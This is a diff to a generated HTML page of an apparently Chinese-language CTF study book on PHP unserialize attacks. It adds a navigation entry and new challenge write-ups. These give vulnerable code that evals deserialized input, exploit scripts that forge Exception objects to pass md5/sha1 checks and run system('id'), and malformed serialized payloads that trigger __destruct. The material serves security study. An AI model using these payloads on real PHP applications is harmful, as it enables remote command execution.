@@ -60,6 +60,8 @@
     <link rel="next" href="查找存在指定魔术方法的类.html" />
     
     
+    <link rel="prev" href="unserialize_bypass.html" />
+    
 
     </head>
     <body>
@@ -418,7 +420,20 @@
             <ul class="articles">
                 
     
-        <li class="chapter active" data-level="1.6.1" data-path="ctf_unserialize.html">
+        <li class="chapter " data-level="1.6.1" data-path="unserialize_bypass.html">
+            
+                <a href="unserialize_bypass.html">
+            
+                    
+                    反序列化中的绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.6.2" data-path="ctf_unserialize.html">
             
                 <a href="ctf_unserialize.html">
             
@@ -431,7 +446,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6.2" data-path="查找存在指定魔术方法的类.html">
+        <li class="chapter " data-level="1.6.3" data-path="查找存在指定魔术方法的类.html">
             
                 <a href="查找存在指定魔术方法的类.html">
             
@@ -444,7 +459,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6.3" data-path="SimpleXMLElement.html">
+        <li class="chapter " data-level="1.6.4" data-path="SimpleXMLElement.html">
             
                 <a href="SimpleXMLElement.html">
             
@@ -457,7 +472,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6.4" data-path="Phar的文件包含与反序列化.html">
+        <li class="chapter " data-level="1.6.5" data-path="Phar的文件包含与反序列化.html">
             
                 <a href="Phar的文件包含与反序列化.html">
             
@@ -470,7 +485,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6.5" data-path="Soap和CRLF攻击.html">
+        <li class="chapter " data-level="1.6.6" data-path="Soap和CRLF攻击.html">
             
                 <a href="Soap和CRLF攻击.html">
             
@@ -483,7 +498,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6.6" data-path="Session不同解析方式.html">
+        <li class="chapter " data-level="1.6.7" data-path="Session不同解析方式.html">
             
                 <a href="Session不同解析方式.html">
             
@@ -914,7 +929,7 @@ $a=<span class="hljs-string">&quot;flag{ccc}&quot;</span>;
 </code></pre>
 <h2 id="&#x9898;&#x89E3;">&#x9898;&#x89E3;</h2>
 <p>&#x200B;        &#x6838;&#x5FC3;&#x601D;&#x8DEF;&#x201C;destruct+toString&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#x201D;&#x914D;&#x5408;&#x201C;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;&#x201D;</p>
-<h3 id="&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;">&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;</h3>
+<h3 id="&#x5E8F;&#x5217;&#x5316;&#x94FE;">&#x5E8F;&#x5217;&#x5316;&#x94FE;</h3>
 <p>&#x200B;        &#x6838;&#x5FC3;&#x653B;&#x51FB;&#x94FE;&#xFF1A;&#x5229;&#x7528;&#x7C7B;B&#x7684;__destruct&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x5185;&#x7684;echo&#xFF0C;&#x89E6;&#x53D1;&#x7C7B;C&#x7684;__toString&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x8C03;&#x7528;file_get_contents&#x83B7;&#x53D6;flag.php&#x5185;&#x5BB9;&#x3002;</p>
 <p>&#x200B;        &#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x94FE;&#xFF1A;</p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
@@ -967,6 +982,140 @@ $_GET[<span class="hljs-string">&apos;b&apos;</span>]=<span class="hljs-string">
 </code></pre>
 <p>&#x200B;        <code>s:8:&quot;password&quot;;</code>&#x5373;&#x4E3A;&#x503C;<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;</code>
 <code>flag.php&quot;;}};</code>&#x5BF9;&#x5E94;&#x7684;&#x53D8;&#x91CF;&#x540D;&#x3002;</p>
+<h1 id="challenge-0x02">Challenge 0X02</h1>
+<h2 id="&#x6E90;&#x7801;">&#x6E90;&#x7801;</h2>
+<p>index.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Timeline</span> </span>{
+    <span class="hljs-keyword">public</span> $var3;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
+        var_dump(md5($this-&gt;var1));
+        var_dump(md5($this-&gt;var2));
+        <span class="hljs-keyword">if</span>( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ){
+            <span class="hljs-keyword">eval</span>($this-&gt;var1);
+        }
+    }
+}
+
+unserialize($_GET[<span class="hljs-number">1</span>]);
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h2 id="&#x9898;&#x89E3;">&#x9898;&#x89E3;</h2>
+<p>&#x5229;&#x7528;&#x539F;&#x751F;&#x7C7B;&#x7684;<em>_toString&#x65B9;&#x6CD5;&#xFF0C;</em>_toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x5728;&#x7C7B;&#x88AB;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x6267;&#x884C;&#x65F6;&#x89E6;&#x53D1;&#xFF0C;&#x5176;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
+<p>&#x5C06;&#x542B;&#x6709;__toString()&#x7684;&#x5B9E;&#x4F8B;&#x8D4B;&#x503C;&#x7ED9;$this-&gt;var1&#x548C;$this-&gt;var2&#xFF1B;&#x7531;&#x4E8E;md5&#x548C;sha1&#x7684;&#x53C2;&#x6570;&#x90FD;&#x662F;string&#xFF0C;&#x4F1A;&#x8C03;&#x7528;__toString()&#x51FD;&#x6570;&#xFF0C;&#x82E5;&#x4E24;&#x4E2A;&#x7C7B;&#x7684;__toString&#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x76F8;&#x540C;&#x4E14;&#x7C7B;&#x4E0D;&#x540C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7ED5;&#x8FC7;&#x3002;</p>
+<h3 id="&#x5BFB;&#x627E;&#x5305;&#x542B;tostring&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x5185;&#x7F6E;&#x7C7B;">&#x5BFB;&#x627E;&#x5305;&#x542B;toString&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x5185;&#x7F6E;&#x7C7B;</h3>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+$classes = get_declared_classes();
+
+<span class="hljs-keyword">foreach</span> ($classes <span class="hljs-keyword">as</span> $class)
+    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-string">&apos;__toString&apos;</span>, get_class_methods($class)))
+        <span class="hljs-keyword">echo</span> $class.PHP_EOL;
+</code></pre>
+<p>&#x57FA;&#x672C;&#x90FD;&#x662F;Exception&#x3001;Error&#x7C7B;&#xFF0C;&#x6211;&#x4EEC;&#x4EE5;Exception&#x7C7B;&#x4E3A;&#x4F8B;&#xFF1A;</p>
+<p><img src="../images/21-6-18_ctf_unserialize_2.png" alt=""></p>
+<h3 id="&#x6784;&#x9020;exception&#x7C7B;">&#x6784;&#x9020;Exception&#x7C7B;</h3>
+<p><strong>exp1.php</strong></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+
+<span class="hljs-comment">// error_reporting(0);</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exceptiop</span></span>{
+    <span class="hljs-keyword">protected</span>  $message ;
+    <span class="hljs-keyword">protected</span>  $file ;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($mess, $file)</span></span>{
+        $this-&gt;message = $mess;
+        $this-&gt;file = $file;
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Timeline</span> </span>{
+    <span class="hljs-keyword">public</span> $var3;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{
+        $evalcode = <span class="hljs-string">&quot;echo 1; __HALT_COMPILER();&quot;</span>;
+        $this-&gt;var1 = <span class="hljs-keyword">new</span> Exceptiop($evalcode,<span class="hljs-string">&quot;in &quot;</span>);
+        $this-&gt;var2 = <span class="hljs-keyword">new</span> Exceptiop($evalcode.<span class="hljs-string">&quot; in&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);
+
+    }
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cc</span><span class="hljs-params">()</span></span>{
+        var_dump(md5($this-&gt;var1));
+        var_dump(md5($this-&gt;var2));
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;
+        var_dump(sha1($this-&gt;var1));
+        var_dump(sha1($this-&gt;var2));
+        var_dump(($this-&gt;var1));
+        var_dump(($this-&gt;var2));
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;\n&quot;</span>;
+        <span class="hljs-keyword">if</span>($this-&gt;var1 !=$this-&gt;var2 &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ){
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span>;
+        }
+    }
+}
+
+$t = <span class="hljs-keyword">new</span> Timeline();
+$t1 = str_replace(<span class="hljs-string">&quot;Exceptiop&quot;</span>,<span class="hljs-string">&quot;Exception&quot;</span>,serialize($t));
+$dd = unserialize($t1);
+<span class="hljs-comment">// $dd-&gt;cc();</span>
+<span class="hljs-keyword">echo</span> urlencode($t1);
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>$file&#x53C2;&#x6570;&#x7528;&#x6765;&#x63A7;&#x5236;&#x7C7B;&#x4E0D;&#x540C;&#x548C;toString&#x76F8;&#x540C;&#xFF0C;HALT_COMPILER()&#x63A7;&#x5236;php&#x6267;&#x884C;&#x505C;&#x6B62;.</p>
+<pre><code>        $evalcode = &quot;echo 1; __HALT_COMPILER();&quot;;
+        $this-&gt;var1 = new Exceptiop($evalcode,&quot;in &quot;);
+        $this-&gt;var2 = new Exceptiop($evalcode.&quot; in&quot;,&quot;&quot;);
+</code></pre><p><strong>exp2.php</strong></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Timeline</span> </span>{
+    <span class="hljs-keyword">public</span> $var3;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
+        var_dump(md5($this-&gt;var1));
+        var_dump(md5($this-&gt;var2));
+        <span class="hljs-keyword">if</span>( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) ){
+            <span class="hljs-keyword">eval</span>($this-&gt;var1);
+        }
+    }
+}
+
+$ex1 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&apos;system(&quot;id&quot;);?&gt;&apos;</span>);$ex2 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&apos;system(&quot;id&quot;);?&gt;&apos;</span>,<span class="hljs-number">1</span>); 
+$wtf = <span class="hljs-keyword">new</span> Timeline();
+$wtf-&gt;var1 = $ex1;
+$wtf-&gt;var2 = $ex2;
+
+<span class="hljs-keyword">echo</span> urlencode(serialize($wtf));
+</code></pre>
+<h1 id="challenge-0x02">Challenge 0X02</h1>
+<h2 id="&#x6E90;&#x7801;">&#x6E90;&#x7801;</h2>
+<p>index.php</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+$line = $_GET[<span class="hljs-number">1</span>];
+
+$flag = file_get_contents(<span class="hljs-string">&apos;/flag&apos;</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>{
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">global</span> $flag;
+    <span class="hljs-keyword">echo</span> $flag;
+  }
+}
+
+$a = @unserialize($line);
+
+<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&apos;Well that was unexpected&#x2026;&apos;</span>);
+
+<span class="hljs-keyword">echo</span> $a;
+</code></pre>
+<h2 id="&#x9898;&#x89E3;">&#x9898;&#x89E3;</h2>
+<p>&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#x8BA9;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x62A5;&#x9519;&#xFF1A;</p>
+<pre><code class="lang-php">payload1: a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">7</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:{}}
+payload2: O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1337</span>:{}
+payload3: O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:{<span class="hljs-string">&quot;1337&quot;</span>:<span class="hljs-number">0</span>}
+</code></pre>
 
                                 
                                 </section>
@@ -994,8 +1143,12 @@ $_GET[<span class="hljs-string">&apos;b&apos;</span>]=<span class="hljs-string">
 
             
                 
+                <a href="unserialize_bypass.html" class="navigation navigation-prev " aria-label="Previous page: 反序列化中的绕过">
+                    <i class="fa fa-angle-left"></i>
+                </a>
                 
-                <a href="查找存在指定魔术方法的类.html" class="navigation navigation-next navigation-unique" aria-label="Next page: 查找存在指定魔术方法的类">
+                
+                <a href="查找存在指定魔术方法的类.html" class="navigation navigation-next " aria-label="Next page: 查找存在指定魔术方法的类">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -1006,7 +1159,7 @@ $_GET[<span class="hljs-string">&apos;b&apos;</span>]=<span class="hljs-string">
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"CTF中的反序列化","level":"1.6.1","depth":2,"next":{"title":"查找存在指定魔术方法的类","level":"1.6.2","depth":2,"path":"PHP/查找存在指定魔术方法的类.md","ref":"./PHP/查找存在指定魔术方法的类.md","articles":[]},"previous":{"title":"0x04 反序列化","level":"1.6","depth":1,"ref":"","articles":[{"title":"CTF中的反序列化","level":"1.6.1","depth":2,"path":"PHP/ctf_unserialize.md","ref":"./PHP/ctf_unserialize.md","articles":[]},{"title":"查找存在指定魔术方法的类","level":"1.6.2","depth":2,"path":"PHP/查找存在指定魔术方法的类.md","ref":"./PHP/查找存在指定魔术方法的类.md","articles":[]},{"title":"SimpleXMLElement","level":"1.6.3","depth":2,"path":"PHP/SimpleXMLElement.md","ref":"./PHP/SimpleXMLElement.md","articles":[]},{"title":"Phar的文件包含与反序列化","level":"1.6.4","depth":2,"path":"PHP/Phar的文件包含与反序列化.md","ref":"./PHP/Phar的文件包含与反序列化.md","articles":[]},{"title":"Soap和CRLF攻击","level":"1.6.5","depth":2,"path":"PHP/Soap和CRLF攻击.md","ref":"./PHP/Soap和CRLF攻击.md","articles":[]},{"title":"SESSION的不同解析方式","level":"1.6.6","depth":2,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/ctf_unserialize.md","mtime":"2021-05-27T04:58:53.408Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-02T13:49:56.324Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"CTF中的反序列化","level":"1.6.2","depth":2,"next":{"title":"查找存在指定魔术方法的类","level":"1.6.3","depth":2,"path":"PHP/查找存在指定魔术方法的类.md","ref":"./PHP/查找存在指定魔术方法的类.md","articles":[]},"previous":{"title":"反序列化中的绕过","level":"1.6.1","depth":2,"path":"PHP/unserialize_bypass.md","ref":"./PHP/unserialize_bypass.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/ctf_unserialize.md","mtime":"2021-06-18T01:41:53.458Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-18T03:58:40.208Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
